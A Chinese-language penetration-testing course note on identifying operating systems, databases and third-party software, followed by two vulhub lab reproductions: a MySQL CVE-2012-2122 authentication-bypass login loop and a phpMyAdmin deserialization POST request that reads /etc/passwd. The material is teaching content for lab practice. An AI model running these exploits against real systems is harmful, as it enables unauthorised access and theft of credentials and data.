## 基础入门-系统及数据库等

```
前言：除去前期讲到过的搭建中间件、网站源码外，容易受到攻击的还有操作系统、数据库、第三方软件平台等，其中此类攻击也能直接影响到WEB或服务器的安全，导致网站或服务器权限的获取
```

![导图](imgs\导图.png)

### 本节内容

- 操作系统层面

  - 识别操作系统常见方法

    ```
    如果对方有网站可以根据网站来识别，如果没网站则通过扫描相关东西来识别
    ```

    - 有网站

      **windows服务器大小写不敏感，Linux服务器大小写敏感**

      ```
      例子：
      访问http://xiaodi8.com/hacK/和
      访问http://xiaodi8.com/hack/的结果相同，
      则说明xiaodi8.com的服务器的操作系统是windows的
      ```

    - 没有网站

      利用nmap来进行扫描

      命令```sudo namp -O 47.75.212.155```

      ![nmap扫描](imgs\nmap扫描.png)

  - 简要了解两者区别及识别意义

    ```
    这两个操作系统在操作、命令、设置、安全方面都有很大的区别，最主要的区别就是网站的路径问题，windows中有c盘d盘f盘等等，在Linux上没有这个东西，Linux和Windows在大小写方面也有不同，有的产品只能在Linux或者只能在Windows上运行……
    
    识别的意义：知道是什么操作系统之后，在后面的测试过程中，要围绕操作系统支持的方面发展
    ```

  - 操作系统层面漏洞类型对应意义

    ```
    有一些漏洞对于我们来讲没有很大的意义，因为这些漏洞只是产生一些危害，而不会造成权限的丢失，例如DDOS攻击，只是影响服务器的服务，而不会造成权限的丢失
    ```

  - 简要操作系统层面漏洞影响范围



- 数据库层面

  - 识别数据库类型的常见方法

    - 小型数据库access
    - 中型数据库mysql
    - 大型数据库sql server

    根据网站的常见搭建组合判断

    ```
    ASP + Access
    php + mysql
    aspx + mssql
    jsp + mssql, oracle
    python + mongodb
    ……
    ```

    通过操作系统判断，access、mssql不支持Linux

    利用端口扫描，端口在扫描的时候会扫描端口的开放情况，数据库在运行的时候会开放一个默认端口

    ```
    mysql:3306
    sqlserver:1433
    oracle:1521
    mongodb:27017
    Redis:6379
    db2:5000
    ```

    ![namp扫描2](imgs\namp扫描2.png)

  - 数据库类型区别及识别意义

    ```
    数据库的不同，它们的安全机制、写法结构也会不同
    不同的数据库的攻击方法、漏洞的影响都会有相应的差异
    ```

  - 数据库常见漏洞类型及攻击方式

  - 简要数据库层面漏洞影响范围

    ```
    数据库是用来存储网站数据的，包括用户数据，
    
    得到对方的数据后能干嘛？得到管理员数据，则可以尝试登录网站后台，得到用户数据，可以尝试登录用户账号，登录之后不仅可以读取，还可以进行修改
    
    通过数据库操作可以进行相关漏洞攻击，有可能获得数据库权限，甚至获得网站权限
    ```



- 第三方层面
  - 如何判断有哪些第三方平台或软件
  - 简要为什么要识别第三方平台或软件
  - 常见第三方平台或软件漏洞类型及攻击
  - 简要第三方平台或软件安全测试的范围



- 补充

  除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件、游戏、负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以需要根据服务器上的服务来选取攻击方式，明确安全测试思路是很重要的！



- 课程安排->漏洞技术->WEB层面，系统层面，第三方等其他



### 本节案例

- 某数据库弱口令及漏洞演示（vulhub/mysql/CVE-2012-2122身份认证绕过漏洞复现）

  - 打开配置好的vulhub靶机，搭建靶场环境

    进入环境目录

    ```
    cd vulhub/mysql/CVE_2012-2112/
    ```

    环境编译

    ```
    sudo docker-compose build 
    ```

    环境搭建

    ```
    sudo docker-compose up -d
    ```
  
  - 漏洞复现

    获取靶机ip地址
  
    ![case1](imgs\case1.png)
  
    打开kail进行验证
  
    使用nmap进行扫描，可以发现服务器上有mysql 5.5.23，说明环境搭建成功。
  
    ![case2](C:\Users\26554\Desktop\xiaodi-master\05.SystemAndDatabase\imgs\case2.png)
  
    使用批处理命令远程登录mysql
  
    ```
    for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done
    ```
  
    ![case3](C:\Users\26554\Desktop\xiaodi-master\05.SystemAndDatabase\imgs\case3.png)
  
    登录成功，漏洞复现完成，删除环境
  
    ```
    sudo docker-compose down -v
    ```
  
- 某第三方应用安全漏洞演示（vulhub/phpmyadmin/WooYun-2016-199433反序列化漏洞复现）

  - 打开配置好的vulhub靶机，搭建靶场环境

    进入环境目录

        cd vulhub/phpmyadmin/WooYun-2016-199433/

     环境编译
    
        sudo docker-compose build 

    
环境搭建
    
        sudo docker-compose up -d
    
- 漏洞复现
  
    发送如下数据包，即可读取```/etc/passwd```:
  
    ```
    POST /scripts/setup.php HTTP/1.1
    Host: your-ip:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 80
    
    action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
    ```
  
    ![case4](imgs\case4.png)
  
    文件访问成功，漏洞复现完成，删除环境
  
    ```
    sudo docker-compose down -v
    ```



### 总结

我们的攻击是多层面的，哪一个层面有漏洞就可以成为一个攻击方向



补充：

服务器有数据库但nmap扫不到数据库端口的情况

```
服务器上装了防护软件，防止我们探测
对方的服务器放在内网上，只将80端口放到外网映射
```

